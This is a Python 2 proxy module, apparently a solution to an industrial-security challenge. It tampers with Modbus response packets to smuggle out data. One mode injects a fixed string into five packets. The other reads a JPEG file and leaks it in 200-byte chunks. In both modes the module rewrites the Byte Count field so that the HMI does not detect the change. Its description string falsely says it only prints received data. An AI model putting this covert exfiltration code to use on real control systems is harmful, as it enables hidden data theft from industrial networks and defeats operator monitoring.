#!/usr/bin/env python2
import os.path as path
import struct

# Used to convert hexadecimal values to bytes format.
import binascii


class Module:
    def __init__(self, incoming=False, verbose=False, options=None):
        self.name = path.splitext(path.basename(__file__))[0]
        self.description = 'Simply print the received data as text'
        self.incoming = incoming  # incoming means module is on -im chain

        # (Q1) A counter to track the leaking amount.
        self.leak_counter = 0

        # A data member to choose right question answer
        # Choose the right option: 0 = Q1, 1 = Q2.
        self.mode = 1

        # (Q2) The part (segment) of the leaked image.
        self.segmentation = 0

    def execute(self, data):
        # Question 1:
        if not self.mode:

            # In this part, we need to leak the string "Otorio Rocks" - 50 times,
            # We'll leak it 5 times (5 packets), each packet contains 10 strings.
            to_leak = 10 * "Otorio Rocks"

            if self.leak_counter < 5:

                # Each `modbus` packet contains a `Byte Count` field that contains the amount of bytes that
                # response contains - so we need to modify it to avoid HMI detection.
                payload = data[:8] + binascii.unhexlify(hex(len(to_leak) + 1)[2:]) + data[9:] + to_leak

                self.leak_counter += 1
            else:
                payload = data
            return payload

        # Question 2:
        else:

            # Opening the image we want to leak.
            with open("image.jpeg", "rb") as image:
                to_leak = image.read()

            # Performing segmentation (partition) over the image.
            segmentation = (len(to_leak) // 200) + 1

            # 0, ... ,n-1 first segments.
            if self.segmentation < segmentation - 1:
                payload = data[:8] + binascii.unhexlify(hex(201)[2:]) + data[9:] + \
                          to_leak[self.segmentation * 200:(self.segmentation + 1) * 200]

                # DEBUG - Ensure that image fully leaked:
                # with open("tmp", "ab") as f:
                #     f.write(to_leak[self.segmentation * 200:(self.segmentation + 1) * 200])

                self.segmentation += 1

            # the last (n-th) segment.
            elif self.segmentation == segmentation - 1:
                payload = data[:8] + binascii.unhexlify(hex(len(to_leak) - (200 * (segmentation - 1)))[2:]) + \
                          data[9:] + to_leak[200 * (segmentation - 1):]

                # DEBUG - Ensure that image fully leaked:
                # with open("tmp", "ab") as f:
                #     f.write(to_leak[200 * (segmentation - 1):])

                self.segmentation += 1
            else:
                payload = data
            return payload


    def help(self):
        return ""


if __name__ == '__main__':
    print 'This module is not supposed to be executed alone!'
